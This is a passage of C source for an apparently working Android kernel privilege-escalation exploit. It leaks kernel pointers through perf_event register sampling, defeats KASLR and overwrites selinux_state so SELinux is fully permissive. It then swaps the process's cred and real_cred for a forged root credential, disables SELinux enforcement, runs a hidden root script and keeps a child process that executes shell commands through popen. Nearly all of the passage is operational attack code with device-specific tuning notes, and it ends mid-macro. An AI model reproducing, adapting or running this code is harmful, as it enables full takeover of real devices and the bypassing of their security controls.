    pr_warning("no cred from task leak, cannot leak security\n");
    return 0;
  }
  pr_info("security leak: task=%016lx cred=%016lx, running setpriority storm\n",
          (unsigned long)task, (unsigned long)g_leaked_cred);
  struct { uintptr_t addr; int cnt; } modes[64];
  int nm = 0;
  memset(modes, 0, sizeof(modes));
  struct perf_event_attr pe;
  memset(&pe, 0, sizeof(pe));
  pe.type = PERF_TYPE_SOFTWARE;
  pe.config = PERF_COUNT_SW_CPU_CLOCK;
  pe.size = sizeof(pe);
  pe.sample_period = 2000;
  pe.sample_type = PERF_SAMPLE_REGS_INTR;
  pe.sample_regs_intr = (1ULL << 31) - 1;
  pe.disabled = 1;
  int fd = (int)syscall(__NR_perf_event_open, &pe, 0, -1, -1, 0);
  if (fd < 0) { pr_error("perf(sec) failed\n"); return 0; }
  size_t msz = 4096 * (1 + 32);
  void *buf = mmap(NULL, msz, PROT_READ|PROT_WRITE, MAP_SHARED, fd, 0);
  if (buf == MAP_FAILED) { close(fd); return 0; }
  ioctl(fd, PERF_EVENT_IOC_ENABLE, 0);
  for (int i = 0; i < 60000; i++) {
    setpriority(PRIO_PROCESS, 0, -20);
    syscall(__NR_getpid);
  }
  ioctl(fd, PERF_EVENT_IOC_DISABLE, 0);
  struct perf_event_mmap_page *hdr = buf;
  uint64_t head = hdr->data_head;
  __sync_synchronize();
  char *base2 = (char *)buf + 4096;
  size_t dsz = 4096 * 32;
  uint64_t pos = hdr->data_tail;
  while (pos < head) {
    struct perf_event_header *ev = (void *)(base2 + (pos % dsz));
    if (ev->size == 0) break;
    if (ev->type == PERF_RECORD_SAMPLE) {
      char *p2 = (char *)ev + sizeof(*ev);
      p2 += 8; /* IP */
      uint64_t abi = *(uint64_t *)p2; p2 += 8;
      if (abi == 1 || abi == 2) {
        uint64_t *regs = (uint64_t *)p2;
        for (int r = 0; r < 31; r++) {
          uint64_t v = regs[r];
          if (v >= 0xffffff8000000000ULL && v < 0xffffffc000000000ULL &&
              v != task && v != g_leaked_cred) {
            int found = -1;
            for (int m = 0; m < nm; m++)
              if (modes[m].addr == v) { found = m; break; }
            if (found >= 0) modes[found].cnt++;
            else if (nm < 64) { modes[nm].addr = v; modes[nm].cnt = 1; nm++; }
          }
        }
      }
    }
    pos += ev->size;
  }
  hdr->data_tail = head; munmap(buf, msz); close(fd);
  for (int i = 0; i < nm - 1; i++)
    for (int j = i + 1; j < nm; j++)
      if (modes[j].cnt > modes[i].cnt) {
        uintptr_t ta = modes[i].addr; int tc = modes[i].cnt;
        modes[i] = modes[j]; modes[j].addr = ta; modes[j].cnt = tc;
      }
  uintptr_t sec = nm > 0 ? modes[0].addr : 0;
  int sec_votes = nm > 0 ? modes[0].cnt : 0;
  pr_info("security leak: security=%016lx (%d votes, %d candidates)\n",
          (unsigned long)sec, sec_votes, nm);
  for (int i = 0; i < nm && i < 5; i++)
    pr_info("  candidate[%d]: %016lx (%d)\n", i,
            (unsigned long)modes[i].addr, modes[i].cnt);
  /* Reject weak leaks: a garbage cred->security pointer makes EVERY
   * post-root SELinux hook misbehave (observed: 1-vote candidate left
   * the rooted process unable to even read /proc/self/attr/current).
   * The page blob + live SID resolution is the proven fallback. */
  int minv = env_int_range("GHOST_SEC_LEAK_MIN_VOTES", 4, 1, 1000);
  if (sec && sec_votes < minv) {
    pr_warning("security leak: %d votes < min %d - REJECTED "
               "(page blob will be used)\n", sec_votes, minv);
    return 0;
  }
  return sec;
}

/* Leak &selinux_state (the LIVE address, NOT the offsets-table one):
 * the device kernel (ThinLTO/clang-17) shifts the whole .data/.bss region
 * ~+0x750000/+0x1060 relative to the reference vmlinux, so only the LIVE
 * address (or the device-derived table value) is usable. Every pread() of
 * /sys/fs/selinux/enforce runs security_file_permission ->
 * selinux_file_permission -> avc_has_perm(&selinux_state, ...) (x0 arg)
 * AND sel_read_enforce, which loads fsi->state (== &selinux_state) into
 * a callee-saved register and holds it across the whole read - a pread
 * storm makes &selinux_state (and &selinux_avc, loaded as state->avc in
 * avc_lookup, exactly 0x1828 below selinux_state in .bss) the dominant
 * image-range candidates. Returns the number of ranked candidates. */
#define MAX_SEL_CANDS 16
static int perf_leak_selinux_state(uintptr_t *out) {
  struct perf_event_attr pe;
  memset(&pe, 0, sizeof(pe));
  pe.type = PERF_TYPE_SOFTWARE;
  pe.config = PERF_COUNT_SW_CPU_CLOCK;
  pe.size = sizeof(pe);
  pe.sample_period = 1000;
  pe.sample_type = PERF_SAMPLE_IP | PERF_SAMPLE_REGS_INTR;
  pe.sample_regs_intr = (1ULL << 31) - 1;
  pe.disabled = 1;

  errno = 0;
  int fd = (int)syscall(__NR_perf_event_open, &pe, 0, -1, -1, 0);
  if (fd < 0) { pr_error("perf_event_open(selinux) failed errno=%d\n", errno); return 0; }
  size_t msz = 4096 * (1 + 32);
  void *buf = mmap(NULL, msz, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0);
  if (buf == MAP_FAILED) { pr_error("perf mmap(selinux) failed\n"); close(fd); return 0; }
  int ef = open("/sys/fs/selinux/enforce", O_RDONLY);
  char tbuf[16];
  ioctl(fd, PERF_EVENT_IOC_ENABLE, 0);
  for (int i = 0; i < 200000; i++) {
    if (ef >= 0) pread(ef, tbuf, sizeof(tbuf), 0);
    syscall(__NR_getpid);
  }
  ioctl(fd, PERF_EVENT_IOC_DISABLE, 0);

  struct perf_event_mmap_page *hdr = buf;
  uint64_t head = hdr->data_head;
  __sync_synchronize();
  char *base = (char *)buf + 4096;
  size_t dsz = 4096 * 32;
  uint64_t pos = hdr->data_tail;
  uintptr_t cands[512]; int nc = 0;
  while (pos < head && nc < 512 * 16) {
    struct perf_event_header *ev = (void *)(base + (pos % dsz));
    if (ev->size == 0) break;
    if (ev->type == PERF_RECORD_SAMPLE) {
      char *p = (char *)ev + sizeof(*ev);
      p += 8; /* skip IP */
      uint64_t abi = *(uint64_t *)p; p += 8;
      if (abi == 1 || abi == 2) {
        uint64_t *regs = (uint64_t *)p;
        for (int i = 0; i < 31 && nc < 512 * 16; i++) {
          uint64_t v = regs[i];
          if (v >= kaslr_base && v < kaslr_base + 0x1D00000ULL &&
              (v & 7) == 0 && v != g_leaked_task)
            cands[nc++ & 511] = v;
        }
      }
    }
    pos += ev->size;
  }
  hdr->data_tail = head; munmap(buf, msz); close(fd);
  if (ef >= 0) close(ef);
  int total = nc > 512 ? 512 : nc;
  uintptr_t ranked[MAX_SEL_CANDS]; int ranked_cnt[MAX_SEL_CANDS]; int nrank = 0;
  for (int i = 0; i < total && nrank < MAX_SEL_CANDS; i++) {
    int found = -1;
    for (int j = 0; j < nrank; j++) if (ranked[j] == cands[i]) { found = j; break; }
    if (found >= 0) { ranked_cnt[found]++; continue; }
    ranked[nrank] = cands[i]; ranked_cnt[nrank] = 1; nrank++;
  }
  for (int i = 0; i < nrank - 1; i++)
    for (int j = i + 1; j < nrank; j++)
      if (ranked_cnt[j] > ranked_cnt[i]) {
        uintptr_t t = ranked[i]; ranked[i] = ranked[j]; ranked[j] = t;
        int tc = ranked_cnt[i]; ranked_cnt[i] = ranked_cnt[j]; ranked_cnt[j] = tc;
      }
  for (int i = 0; i < nrank; i++) {
    out[i] = ranked[i];
    pr_info("selinux_state candidate[%d]: %016lx (%d votes) [anchor+%016lx]\n",
            i, (unsigned long)out[i], ranked_cnt[i],
            (unsigned long)(out[i] - kaslr_base));
  }
  return nrank;
}

struct child_pipes { int task_r, task_w, cmd_r, cmd_w, uid_r, uid_w; };
static void child_main(struct child_pipes *p);

static void child_main(struct child_pipes *p) {
  close(p->task_r); close(p->cmd_w); close(p->uid_r);
  uintptr_t my_task = perf_find_task();
  write(p->task_w, &my_task, sizeof(my_task));
  close(p->task_w);
  if (!my_task) _exit(1);
  char cmd;
  while (read(p->cmd_r, &cmd, 1) == 1) {
    if (cmd == 'C') { uint32_t uid = getuid(); write(p->uid_w, &uid, sizeof(uid)); }
    else if (cmd == 'G') break;
  }
  close(p->cmd_r); close(p->uid_w);
  if (getuid() != 0) _exit(1);
  pid_t gc = fork();
  if (gc == 0) {
    int efd = open("/sys/fs/selinux/enforce", O_WRONLY);
    if (efd >= 0) { write(efd, "0", 1); close(efd); }
    execl("/system/bin/sh", "sh", "/data/local/tmp/.ghostlock_root.sh", NULL);
    _exit(1);
  }
  if (gc < 0) _exit(1);
  int status = 0;
  while (waitpid(gc, &status, 0) < 0) {
    if (errno == EINTR) continue;
    _exit(1);
  }
  if (WIFEXITED(status)) _exit(WEXITSTATUS(status));
  if (WIFSIGNALED(status)) _exit(128 + WTERMSIG(status));
  _exit(1);
}

static pid_t spawn_child(struct child_pipes *p) {
  int p1[2], p2[2], p3[2];
  if (pipe(p1) < 0 || pipe(p2) < 0 || pipe(p3) < 0) return -1;
  p->task_r = p1[0]; p->task_w = p1[1];
  p->cmd_r = p2[0]; p->cmd_w = p2[1];
  p->uid_r = p3[0]; p->uid_w = p3[1];
  pid_t child = fork();
  if (child < 0) return -1;
  if (child == 0) { child_main(p); _exit(1); }
  close(p->task_w); close(p->cmd_r); close(p->uid_w);
  return child;
}

static int run_selftest(void) {
  disable_rseq_for_thread();
  set_unbuffer();
  set_limit();
  if (!active_offsets && select_offsets() < 0) return 1;
  init_p0_profile();
  init_ashmem_path();
  pin_to_core(CORE);
  kaslr_base = KIMAGE_TEXT_BASE;
  if (active_offsets->kimage_text_base) kaslr_base = active_offsets->kimage_text_base;
  kaslr_done = 1;
  timer_reset();
  TIMER("exploit start");

  ghost_reset_plans();
  pr_info("selftest: mode 5 write into spray page\n");
  do_one_write(0, "selftest write", 5);
  pr_info("selftest result: %s (g_route_write_ok=%d)\n",
          g_route_write_ok ? "WRITE VERIFIED" : "write FAILED",
          g_route_write_ok);
  return g_route_write_ok ? 0 : 1;
}

/* --cred: task_struct leak (perf regs) + KASLR base (perf min_ip) +
 * three-walk route (mode 7, default):
 *   walk 0: 8-byte ZERO at selinux_state (enforcing=0 AND initialized=0
 *           -> avc_denied() never denies, security_compute_av()
 *           short-circuits to allowed=~0: full permissive). This kills
 *           the kernel-SID EACCES problem: the main thread keeps sid=1
 *           (u:r:kernel) but nothing is denied anymore, so openat/exec
 *           work for the root shell.
 *   walk 1: task->cred = fake_cred (uid 0, caps FULL, self-contained
 *           fake user_namespace on the spray page)
 *   walk 2: task->real_cred = fake_cred (required: commit_creds() at
 *           execve BUG_ONs unless cred == real_cred)
 * All three erases run against ONE reclaimed page (the same-page overlay
 * retry rounds), consuming exactly the three rungs of the monotonic
 * nice ladder (0->7->14->19).
 * Falls back to mode 6 (cred + real_cred only) when the SELinux write
 * cannot be armed safely (no selinux_state offset, kaslr sanity failed,
 * or GHOST_SELINUX=0). */
static int run_cred_swap(void) {
  disable_rseq_for_thread();
  set_unbuffer();
  set_limit();
  if (!active_offsets && select_offsets() < 0) return 1;
  init_p0_profile();
  init_ashmem_path();
  pin_to_core(CORE);
  kaslr_base = KIMAGE_TEXT_BASE;
  if (active_offsets->kimage_text_base) kaslr_base = active_offsets->kimage_text_base;
  kaslr_done = 1;
  timer_reset();
  TIMER("exploit start");

  /* 1. leak own task (this also recovers kaslr_base = runtime _text) */
  g_leaked_task = perf_leak_own_task();
  if (!g_leaked_task) {
    pr_error("task leak failed - cannot proceed\n");
    return 1;
  }
  pr_info("cred mode: task=%016lx (fake user_ns on spray page)\n",
          (unsigned long)g_leaked_task);

  /* 2. SELinux-off target (mode 7): the device kernel (ThinLTO/clang-17)
   * has .text+.rodata ~7.5MB LARGER than the reference vmlinux, so the
   * whole .data/.bss region shifts and the reference table offsets are
   * NOT device-valid (verified on device: the table-derived target lay
   * past the image end and faulted at rb_erase+0x74; the boot log shows
   * .data at device_text+0x1940000). The target is the boot-log-derived
   * DEVICE address baked into the table
   * (off_selinux_enforcing_device, anchor-relative), optionally
   * sanity-checked against the open-storm perf leak (informational -
   * the leak's candidates cluster around the derived address but the
   * vote signal is weak). The consumer's enforce readback after round 1
   * is the authoritative verification. */
  int selinux_mode = 0;
  {
    /* 1.5 The setpriority(-20) storm (both modes): RLIMIT_NICE=40 on this
     * device lets the calls succeed, parking the main thread (and every
     * thread it later creates) at nice -20 - a preemption shield for the
     * critical discard->capture window. The candidate census it prints
     * is diagnostic only (the reference-table init_user_ns match is a
     * known false positive on the device layout). */
    if (active_offsets->off_init_user_ns && kaslr_done) {
      validate_device_symbol_layout();
    }
    /* The REAL device &init_user_ns (device table, anchor-relative) -
     * set BEFORE the payload build (do_one_write -> prepare_skb_payload
     * -> fill_fake_cred_suite reads it): fake_cred->user_ns must point
     * here or every capable() call fails (CAP_DAC_OVERRIDE, CAP_SYSLOG,
     * ...) and the rooted thread cannot create files or exec. */
    if (active_offsets->off_init_user_ns_device && kaslr_done) {
      g_init_user_ns_addr = kaslr_base +
                           active_offsets->off_init_user_ns_device;
      pr_info("device &init_user_ns = %016lx (anchor+%016lx) - "
              "fake_cred->user_ns\n",
              (unsigned long)g_init_user_ns_addr,
              (unsigned long)active_offsets->off_init_user_ns_device);
    } else {
      g_init_user_ns_addr = 0;
    }
  }
  if (active_offsets->off_selinux_enforcing_device && kaslr_done &&
      env_flag("GHOST_SELINUX", 1)) {
    g_selinux_target = kaslr_base +
                      active_offsets->off_selinux_enforcing_device;
    if ((g_selinux_target & 7) == 0) {
      /* Pair-agreement diagnostic: &selinux_avc sits exactly 0x1828
       * below &selinux_state in .bss in both the reference and the
       * device build (verified via the perf leak across boots). Seeing
       * the state itself and/or the avc partner among the leak
       * candidates confirms the device-derived target; seeing NEITHER
       * is a warning but not a blocker (the pread-storm sampling is
       * noisy). The consumer's enforce readback after round 1 is the
       * authoritative verification. */
      uintptr_t sel_cands[MAX_SEL_CANDS];
      int nsel = perf_leak_selinux_state(sel_cands);
      int have_state = -1, have_avc = -1;
      for (int i = 0; i < nsel; i++) {
        if (sel_cands[i] == g_selinux_target) have_state = i;
        if (sel_cands[i] == g_selinux_target - 0x1828ULL) have_avc = i;
      }
      pr_info("selinux target %016lx (device table anchor+%016lx); "
              "leak: state=%d avc(pair-0x1828)=%d%s\n",
              (unsigned long)g_selinux_target,
              (unsigned long)active_offsets->off_selinux_enforcing_device,
              have_state, have_avc,
              (have_state >= 0 || have_avc >= 0)
                  ? " - PAIR AGREEMENT"
                  : " (no pair candidates sampled; enforce readback will verify)");
      selinux_mode = 1;
      g_selinux_write_armed = 1;
      pr_info("mode 7 armed: plan0 selinux zero, plan1 cred, "
              "plan2 real_cred\n");
    } else {
      g_selinux_target = 0;
      pr_warning("selinux write NOT armed (bad derived target) - "
                 "falling back to mode 6\n");
    }
  } else if (!env_flag("GHOST_SELINUX", 1)) {
    pr_info("GHOST_SELINUX=0 - mode 6 (cred swap only)\n");
  }

  /* Shared-memory relay: fork a child that survives the exploit and
   * provides a fallback command proxy. The main thread (post-cred-swap)
   * has uid=0 but kernel SID -> no file I/O. The child has original
   * shell creds (uid=2000, shell SELinux context) and CAN do I/O.
   *
   * Protocol (two-phase):
   *   Phase 1: parent writes relay data, sets ready=1.
   *            Child writes relay data to file + stdout.
   *   Phase 2: parent writes shell commands to cmd[], sets cmd_ready=1.
   *            Child executes them, writes output to resp[], sets resp_ready=1.
   *            Parent reads resp and writes to relay for disk output.
   *
   * The child NEVER exits - it loops serving commands until parent
   * sets cmd[] = "EXIT" or closes the relay. */
  struct shmem_relay {
    volatile int ready;       /* phase 1: relay data ready */
    volatile int len;         /* bytes of relay payload */
    volatile int cmd_ready;   /* phase 2: parent wrote a command */
    volatile int cmd_len;     /* length of command (0 = no cmd) */
    volatile int resp_ready;  /* child wrote response */
    volatile int resp_len;    /* length of response */
    char data[16384];         /* relay data + command + response overlay */
    /* data layout: [0..8191] = relay payload
     *              [8192..12287] = command (4KB)
     *              [12288..16383] = response (4KB) */
    volatile uint32_t child_sid_cached; /* shell SID loaded from
                                         * .gl_sid_cache (0 = none) */
    char child_ctx[128];      /* child's SELinux context string */
    char child_fp[160];       /* ro.build.fingerprint at fork time */
    volatile int child_ready; /* Phase 0 fully published */
    int child_ngrps;          /* supplementary group count */
    uint32_t child_grps[16];  /* supplementary gids (unsorted) */
  };
  #define RELAY_DATA_MAX 8192
  /* Shell-SID cache: the SID table is built at policy load, and the
   * policy ships with the build -- so a discovered shell SID is stable
   * across boots of the same fingerprint. The child loads it pre-exploit
   * and the parent verifies it live (one readback) before trusting it. */
  #define GL_SID_CACHE_PATH "/data/local/tmp/.gl_sid_cache"
  #define GL_SID_CACHE_TAG  "GL_SID_CACHE "
  /* probe file the child pre-creates for the parent's faccessat scan */
  #define GL_SID_PROBE_PATH "/data/local/tmp/.gl_probe"
  #define RELAY_CMD_OFF  8192
  #define RELAY_CMD_MAX  4096
  #define RELAY_RESP_OFF 12288
  #define RELAY_RESP_MAX 4096
  struct shmem_relay *relay = mmap(NULL, sizeof(*relay),
      PROT_READ|PROT_WRITE, MAP_SHARED|MAP_ANONYMOUS, -1, 0);
  pid_t relay_child_pid = 0;
  if (relay != MAP_FAILED) {
    relay->ready = 0;
    relay->len = 0;
    relay->cmd_ready = 0;
    relay->cmd_len = 0;
    relay->resp_ready = 0;
    relay->resp_len = 0;
    relay_child_pid = fork();
    if (relay_child_pid == 0) {
      /* ==== RELAY CHILD: original shell creds, CAN do file I/O ==== */
      /* Phase 0: publish shell-SID info to the parent BEFORE the exploit
       * runs, so the parent never needs the old 32K-SID openat storm:
       *   - own context string (the verification target for any SID)
       *   - ro.build.fingerprint (cache invalidation key: the SELinux
       *     policy -- and thus the SID table -- ships with the build)
       *   - the cached shell SID persisted by a previous successful run
       *     (SID assignment is stable across boots for a given policy)
       * Also pre-creates the probe file the parent's bounded fallback
       * scan touches via faccessat (one syscall per trial, no fds).
       * NOTE: there is NO userspace API for the numeric SID itself --
       * the selinuxfs `context` file round-trips context STRINGS (and
       * its write is denied for the shell domain on this device), so
       * the cache + live verification is the only reliable path. */
      uint32_t child_sid_cached = 0;
      char child_ctx[128] = {0};
      char child_fp[PROP_VALUE_MAX] = {0};
      int child_ngrps = 0;
      gid_t child_grps[16] = {0};
      {
        int af = open("/proc/self/attr/current", O_RDONLY);
        if (af >= 0) {
          int n = (int)read(af, child_ctx, sizeof(child_ctx)-1);
          close(af);
          if (n > 0) {
            child_ctx[n] = 0;
            while (n > 0 && (child_ctx[n-1] == '\n' || child_ctx[n-1] == 0))
              child_ctx[--n] = 0;
          }
        }
        __system_property_get("ro.build.fingerprint", child_fp);
        /* Supplementary groups: the fake cred's group_info is built from
         * these. They fix post-root DAC on shell-owned objects (uid 0 is
         * "other" on /data/local/tmp's drwxrwx--x) and /proc visibility
         * (hidepid=invisible,gid=3009). */
        {
          int nq = getgroups(0, NULL);
          gid_t gl[16];
          if (nq > 16) nq = 16;
          if (nq > 0) nq = getgroups(nq, gl);
          if (nq > 0) {
            child_ngrps = nq;
            for (int i = 0; i < nq; i++) child_grps[i] = gl[i];
          }
        }
        int pf = open(GL_SID_PROBE_PATH, O_WRONLY|O_CREAT|O_TRUNC, 0666);
        if (pf >= 0) { write(pf, "gl", 2); close(pf); }
        /* Load the cached shell SID. Cache file format (one line):
         *   GL_SID_CACHE FP=<fingerprint> SID=<n> CTX=<context>
         * Trust it only when fingerprint AND context match this boot:
         * an OTA changes the policy and moves every SID. */
        int cf = open(GL_SID_CACHE_PATH, O_RDONLY);
        if (cf >= 0) {
          char cbuf[512] = {0};
          int cn = (int)read(cf, cbuf, sizeof(cbuf)-1);
          close(cf);
          if (cn > 0) {
            cbuf[cn] = 0;
            uint32_t csid = 0;
            char cctx[128] = {0};
            char cfp[PROP_VALUE_MAX] = {0};
            char *line = cbuf;
            while (*line) {
              char *eol = line;
              while (*eol && *eol != '\n') eol++;
              char saved = *eol;
              *eol = 0;
              if (strncmp(line, GL_SID_CACHE_TAG,
                          strlen(GL_SID_CACHE_TAG)) == 0) {
                char *p = line + strlen(GL_SID_CACHE_TAG);
                while (*p) {
                  if (strncmp(p, "FP=", 3) == 0) {
                    char *v = p + 3; char *o = cfp;
                    while (*v && *v != ' ' &&
                           (long)(o - cfp) < (long)sizeof(cfp)-1) *o++ = *v++;
                    *o = 0; p = v;
                  } else if (strncmp(p, "SID=", 4) == 0) {
                    p += 4;
                    unsigned long acc = 0;
                    while (*p >= '0' && *p <= '9') {
                      acc = acc*10 + (unsigned long)(*p - '0'); p++;
                    }
                    csid = (uint32_t)acc;
                  } else if (strncmp(p, "CTX=", 4) == 0) {
                    char *v = p + 4; char *o = cctx;
                    while (*v && *v != ' ' &&
                           (long)(o - cctx) < (long)sizeof(cctx)-1) *o++ = *v++;
                    *o = 0; p = v;
                  } else {
                    p++;
                  }
                  while (*p == ' ') p++;
                }
              }
              if (!saved) break;
              line = eol + 1;
            }
            int fp_ok = (cfp[0] == 0) || strcmp(cfp, child_fp) == 0;
            int ctx_ok = (cctx[0] == 0) || strcmp(cctx, child_ctx) == 0;
            if (csid > 0 && fp_ok && ctx_ok) child_sid_cached = csid;
          }
        }
      }
      /* Publish to the parent (it reads these only after the walks,
       * long after this point -- the fence is belt-and-braces). */
      if (relay != MAP_FAILED) {
        relay->child_sid_cached = child_sid_cached;
        snprintf(relay->child_ctx, sizeof(relay->child_ctx), "%s", child_ctx);
        snprintf(relay->child_fp, sizeof(relay->child_fp), "%s", child_fp);
        relay->child_ngrps = child_ngrps;
        for (int i = 0; i < child_ngrps && i < 16; i++)
          relay->child_grps[i] = (uint32_t)child_grps[i];
        __atomic_thread_fence(__ATOMIC_SEQ_CST);
        relay->child_ready = 1;
      }
      /* Phase 1: wait for relay data, dump to file + stdout. The wait
       * must outlast a full multi-attempt run (each reclaim round is
       * ~40s; CRED_ATTEMPTS up to 6) - the old 60s window expired mid-
       * run on slow boots and the payload was never dumped. */
      __atomic_thread_fence(__ATOMIC_SEQ_CST);
      for (int w = 0; w < 6000 && !relay->ready; w++)
        usleep(100000);
      if (relay->ready && relay->len > 0) {
        char pre[512];
        int pl = snprintf(pre, sizeof(pre),
          "CHILD_CTX=%s CACHED_SID=%u FP=%s\n",
          child_ctx, child_sid_cached, child_fp);
        int rf = open("/data/local/tmp/gl2_relay.txt",
                      O_WRONLY|O_CREAT|O_TRUNC, 0644);
        if (rf >= 0) {
          write(rf, pre, pl);
          write(rf, relay->data, relay->len);
          close(rf);
        }
        write(1, pre, pl);
        write(1, relay->data, relay->len);
        fsync(1);
        /* Persist the "GL_SID_CACHE ..." marker line the parent appended
         * to the payload, so the next run can skip the SID scan. */
        {
          char *base = relay->data;
          int len = relay->len;
          int taglen = (int)strlen(GL_SID_CACHE_TAG);
          int pos = 0;
          while (pos < len) {
            int eol = pos;
            while (eol < len && base[eol] != '\n') eol++;
            if (eol - pos > taglen &&
                memcmp(base + pos, GL_SID_CACHE_TAG, (size_t)taglen) == 0) {
              int wf = open(GL_SID_CACHE_PATH,
                            O_WRONLY|O_CREAT|O_TRUNC, 0644);
              if (wf >= 0) {
                write(wf, base + pos, (size_t)(eol - pos));
                write(wf, "\n", 1);
                close(wf);
              }
            }
            pos = eol + 1;
          }
        }
      }
      /* Phase 2: command proxy loop. Parent writes commands into
       * data[RELAY_CMD_OFF..], sets cmd_len and cmd_ready=1.
       * Child executes, writes output to data[RELAY_RESP_OFF..],
       * sets resp_len and resp_ready=1. Exit on "EXIT" command. */
      relay->cmd_ready = 0;
      relay->cmd_len = 0;
      relay->resp_ready = 0;
      relay->resp_len = 0;
      __atomic_thread_fence(__ATOMIC_SEQ_CST);
      for (;;) {
        /* Poll for commands (100ms) */
        if (relay->cmd_ready && relay->cmd_len > 0 &&
            relay->cmd_len < RELAY_CMD_MAX) {
          char *cmd = relay->data + RELAY_CMD_OFF;
          cmd[relay->cmd_len] = '\0';
          /* Check for exit signal */
          if (cmd[0] == 'E' && cmd[1] == 'X' && cmd[2] == 'I' &&
              cmd[3] == 'T' && cmd[4] == '\0') {
            relay->resp_len = 0;
            relay->resp_ready = 1;
            break;
          }
          /* Execute command via popen and capture output */
          char *resp = relay->data + RELAY_RESP_OFF;
          int rl = 0;
          /* Prefix: show what we ran */
          #define CHILD_APPEND(s) do { \
            const char *_cs = (s); int _cl = 0; \
            while (_cs[_cl]) _cl++; \
            if (rl + _cl < RELAY_RESP_MAX - 1) { \
              for (int _cj = 0; _cj < _cl; _cj++) resp[rl++] = _cs[_cj]; \
            } \
          } while(0)
          CHILD_APPEND("$ "); CHILD_APPEND(cmd); CHILD_APPEND("\n");
          FILE *fp = popen(cmd, "r");
          if (fp) {
            char buf[1024];
            while (fgets(buf, sizeof(buf), fp) &&
                   rl < RELAY_RESP_MAX - 128) {
              for (int ci = 0; buf[ci] && rl < RELAY_RESP_MAX - 2; ci++)
                resp[rl++] = buf[ci];
            }
            int rc = pclose(fp);
            if (rc != 0 && rl < RELAY_RESP_MAX - 32) {
              CHILD_APPEND("[exit=");
              char ec[16]; int ecl = 0; int ev = WEXITSTATUS(rc);
              if (ev == 0) ec[ecl++] = '0';
              else { char t[8]; int ti = 0;
                while (ev) { t[ti++] = '0' + ev % 10; ev /= 10; }
                while (ti) ec[ecl++] = t[--ti]; }
              for (int cj = 0; cj < ecl; cj++) resp[rl++] = ec[cj];
              CHILD_APPEND("]");
            }
          } else {
            CHILD_APPEND("popen failed: ");
            char *es = strerror(errno);
            if (es) CHILD_APPEND(es);
          }
          CHILD_APPEND("\n");
          resp[rl] = '\0';
          #undef CHILD_APPEND
          relay->resp_len = rl;
          __atomic_thread_fence(__ATOMIC_SEQ_CST);
          relay->resp_ready = 1;
          relay->cmd_ready = 0;
          relay->cmd_len = 0;
        }
        usleep(100000);
        /* Also check if parent died (relay page became invalid) */
        if (relay->ready == 99) break; /* exit signal from parent */
      }
      _exit(0);
    }
    /* Parent continues with exploit */
  }

  /* Leak cred->security pointer so fake_cred reuses the real shell
   * security blob. Without this, the fake blob has kernel SID and
   * security_file_permission blocks all post-root file I/O. */
  if (!g_leaked_security_ptr) {
    uintptr_t sec = perf_leak_cred_security(g_leaked_task);
    if (sec) {
      g_leaked_security_ptr = sec;
      pr_info("fake_cred->security = %016lx (real shell blob)\n",
              (unsigned long)sec);
    } else {
      pr_warning("security leak failed, using fake blob (kernel SID)\n");
    }
  }

  /* Consume the child's Phase-0 publication: the supplementary groups
   * are baked into the fake cred's group_info BEFORE the payload is
   * built (prepare_skb_payload -> fill_fake_cred_suite reads them). */
  {
    /* Fallback: the standard adb-shell supplementary set (covers the
     * DAC group 2000 and the hidepid-exempt gid 3009). */
    static const uint32_t fb[] = {1004, 1007, 1011, 1015, 1028, 1078,
                                  1079, 2000, 3001, 3002, 3003, 3006,
                                  3009, 3011, 3012};
    g_fake_ngrps = (int)(sizeof(fb) / sizeof(fb[0]));
    for (int i = 0; i < g_fake_ngrps; i++) g_fake_grps[i] = fb[i];
    if (relay != MAP_FAILED) {
      /* The child publishes in microseconds; bound the wait anyway. */
      for (int w = 0; w < 2000 && !relay->child_ready; w++) usleep(1000);
      __atomic_thread_fence(__ATOMIC_SEQ_CST);
      if (relay->child_ngrps > 0) {
        g_fake_ngrps = relay->child_ngrps > 16 ? 16 : relay->child_ngrps;
        for (int i = 0; i < g_fake_ngrps; i++)
          g_fake_grps[i] = relay->child_grps[i];
      }
    }
  }

  /* SID resolution config (read NOW: post-walk code must not call libc
   * env/parse helpers). Preference order after root: cached SID from
   * .gl_sid_cache (child-loaded, live-verified) > GHOST_SID env override
   * > compiled default 1374 (device-proven) > bounded faccessat scan. */
  int sid_env_override = env_int_range("GHOST_SID", 0, 0, 32767);
  int sid_default = env_int_range("GHOST_SID_DEFAULT", 1374, 0, 32767);
  int sid_scan_max = env_int_range("GHOST_SID_MAX", 4096, 64, 32767);
  int sid_scan_enable = env_flag("GHOST_SID_SCAN", 1);
  g_settle_ms = env_int_range("GHOST_SETTLE_MS", 4000, 0, 30000);

  uint32_t uid_before = getuid();
  int ghost_exec = env_flag("GHOST_EXEC", 1);
  int ghost_probe = env_flag("GHOST_PROBE", 0); /* post-root DAC/SELinux bisection probes */
  int attempts = env_int_range("CRED_ATTEMPTS", 3, 1, 6);
  for (int att = 1; att <= attempts; att++) {
    pr_info("%s attempt %d/%d\n",
            selinux_mode ? "selinux+cred swap" : "cred swap", att, attempts);
    /* NOTE: no slab_drain here! Its 400-2000 unpinned fork+exit pairs churn
     * the mm cache's partial lists with MIXED pages (foreign live mms + free
     * slots) on every CPU - the leak child's mm then lands on such a page,
     * the choreography can never empty it, no discard happens and the walk
     * fires on the stale mm page (kernel panic). The sacrificial burst in
     * prepare_kernel_page handles the mixed-page draining instead. */
    if (env_flag("CRED_SLAB_DRAIN", 0))
      slab_drain();
    g_consumer_task = 0;
    /* Mode 7 targets selinux_state first (the cred plans are pushed
     * inside do_one_write); mode 6 targets task->cred directly. */
    if (!do_one_write(selinux_mode ? g_selinux_target
                                   : g_leaked_task + TASK15_CRED_OFF,
                      selinux_mode ? "selinux+cred swap" : "cred swap",
                      selinux_mode ? WRITE_MODE_CRED_SELINUX : 6)) continue;
    uint32_t uid_now = syscall(__NR_getuid);
    if (g_route_write_ok && (uid_now == 0 || uid_now == 0xffffff80u)) {
      /* ============ ROOT ACHIEVED - raw syscalls ONLY from here on ===== */
      int hits = atomic_load(&consumer_erase_hits);
      int plans = ghost_plan_count();

      /* ---- relay helpers: append to relay->data at relay->len (NEVER
       * reset relay->len - the later battery section appends to it). */
      #define RELAY_PUTC(c) do { \
        if (relay != MAP_FAILED && relay->len < (int)sizeof(relay->data) - 1) \
          relay->data[relay->len++] = (char)(c); \
      } while(0)
      #define RELAY_STR(s) do { \
        const char *_s = (s); int _l = 0; \
        while (_s[_l]) _l++; \
        if (relay != MAP_FAILED && relay->len + _l < (int)sizeof(relay->data) - 1) { \
